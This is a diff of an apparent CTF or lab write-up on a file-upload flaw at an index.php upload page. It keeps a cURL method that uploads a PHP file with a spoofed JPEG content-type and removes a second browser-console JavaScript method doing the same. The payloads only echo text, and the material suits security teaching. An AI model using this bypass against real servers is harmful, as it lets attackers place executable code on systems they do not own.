@@ -15,7 +15,7 @@ The upload feature at `/index.php?page=upload` allows attackers to upload PHP fi
 
 ## Exploitation
 
-### **Method 1: cURL Content-Type Spoofing**
+### **cURL Content-Type Spoofing**
 
 ```bash
 echo '<?php echo "hello"; ?>' > test.php
@@ -26,28 +26,6 @@ curl http://<IP_ADDRESS>/index.php?page=upload \
   -F "MAX_FILE_SIZE=100000"
 ```
 - The PHP file is uploaded as if it’s a JPEG by spoofing the content-type.
-
----
-
-### **Method 2: JavaScript in Browser Console**
-
-1. Open the upload page.
-2. Run this in the Console:
-
-   ```javascript
-   async function bypassUpload() {
-     const uploadUrl = window.location.origin + "/index.php?page=upload";
-     const phpCode = "<?php echo 'Bypassed!'; ?>";
-     const formData = new FormData();
-     const fileBlob = new Blob([phpCode], { type: "image/jpeg" });
-     formData.append("uploaded", fileBlob, "image.php");
-     formData.append("Upload", "Upload");
-     const response = await fetch(uploadUrl, { method: "POST", body: formData });
-     const html = await response.text();
-     console.log(html);
-   }
-   bypassUpload();
-   ```
 
 ---
 
